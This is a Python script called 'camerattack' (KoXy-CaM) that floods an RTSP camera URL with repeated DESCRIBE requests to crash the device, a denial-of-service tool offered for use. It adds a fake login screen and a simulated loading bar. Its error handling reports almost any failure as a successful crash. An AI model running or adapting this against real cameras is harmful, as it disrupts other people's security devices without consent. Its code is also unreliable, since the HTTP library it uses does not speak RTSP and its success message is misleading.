import os
import sys
import getpass
import requests
from colorama import Fore, Style
from halo import Halo
import time

threads = 8

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ASCII art for "KoXy-CaM"
logo_art = '''
██╗░░██╗░█████╗░██╗░░██╗██╗░░░██╗░░░░░░░█████╗░░█████╗░███╗░░░███╗
██║░██╔╝██╔══██╗╚██╗██╔╝╚██╗░██╔╝░░░░░░██╔══██╗██╔══██╗████╗░████║
█████═╝░██║░░██║░╚███╔╝░░╚████╔╝░█████╗██║░░╚═╝███████║██╔████╔██║
██╔═██╗░██║░░██║░██╔██╗░░░╚██╔╝░░╚════╝██║░░██╗██╔══██║██║╚██╔╝██║
██║░╚██╗╚█████╔╝██╔╝╚██╗░░░██║░░░░░░░░░╚█████╔╝██║░░██║██║░╚═╝░██║
╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
'''

# Function to perform the RTSP Describe
def rtsp_describe(target, count, username, password):
    try:
        response = requests.request(
            'DESCRIBE',
            target,
            headers={'Accept': 'application/sdp'},
            stream=True,
            verify=False  # Disable SSL verification (use cautiously)
        )

        response.raise_for_status()

    except requests.exceptions.RequestException as e:
        if "Couldn't connect to server" in str(e):
            print(f"{Fore.RED}✖ Can't access stream {target}{Style.RESET_ALL}")
            sys.exit(1)

        print(f"{Fore.GREEN}✓ After {count} tries, the camera seems to have crashed.{Style.RESET_ALL}")
        sys.exit(0)

# Main function
def main():
    red = Fore.RED + Style.BRIGHT

    args = sys.argv[1:]
    if len(args) == 0:
        print("usage: camerattack [RTSP URL]\n\texample: `python camerattack.py rtsp://192.168.1.1:554/live.sdp`\n")
        sys.exit(1)

    target = args[0]
    username = "koxy"  # Hardcoded username
    password = getpass.getpass(prompt=f"{Style.BRIGHT}{Fore.GREEN}Enter password: {Style.RESET_ALL}")

    # Displaying username and hidden password
    print(f"{Style.BRIGHT}{Fore.GREEN}Username: {username} {Style.RESET_ALL}")
    print(f"{Style.BRIGHT}{Fore.GREEN}Password: {'*' * len(password)} {Style.RESET_ALL}")

    # Simulating login success
    print(f"{Fore.GREEN}Login Success{Style.RESET_ALL}")

    # Simulating loading from 1% to 100%
    spinner = Halo(text='Loading:', spinner='dots')
    for i in range(1, 101):
        spinner.text = f'Loading: {i}%'
        spinner.start()
        time.sleep(0.03)  # Adjust the sleep time to control the speed of the progress bar
        spinner.stop()

    # Sleep for 3 seconds
    time.sleep(3)

    spinner.start()
    for count in range(0, 100000, threads):
        spinner.text = f"[Attempt #{count} to #{count+threads-1}] Attacking RTSP stream..."
        spinner.start()

        for thread in range(count, count+threads):
            rtsp_describe(target, thread, username, password)

    spinner.stop()
    print(f"{red}✖ Could not crash camera after 100000 attempts.")
    print("You can try to run the program again, but it's unlikely that this camera can be remotely shut down.")
    print("The reason can be that the network speed and stability between you and the camera is not good enough")
    print("to send requests to the camera quickly enough.")

if __name__ == "__main__":
    print(logo_art)
    main()

